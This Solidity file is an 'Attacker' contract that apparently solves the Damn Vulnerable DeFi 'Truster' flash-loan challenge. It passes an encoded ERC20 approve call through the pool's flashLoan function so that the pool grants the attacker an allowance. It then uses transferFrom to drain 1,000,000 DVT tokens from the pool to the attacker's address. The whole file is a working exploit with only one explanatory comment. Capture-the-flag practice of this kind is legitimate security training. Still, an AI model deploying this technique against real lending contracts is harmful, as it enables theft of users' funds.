// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract Attacker {
    address attacker;
    address token;

    address pool;

    constructor(address attackerAddress, address tokenAddress, address poolAddress) {
        attacker = attackerAddress;
        token = tokenAddress;
        pool = poolAddress;
    }

    function initiateFlashLoan() external {
        // as the flashloan is making an external call we can
        // send approval request to this address for DVT tokens
        // making sure all is done in one transaction
        bytes memory data = abi.encodeWithSelector(0x095ea7b3, address(this), 1_000_000e18);
        TrusterLenderPool(pool).flashLoan(0, address(this), token, data);

        IERC20(token).transferFrom(pool, address(this), 1_000_000e18);
        IERC20(token).transfer(attacker, 1_000_000e18);
    }
}
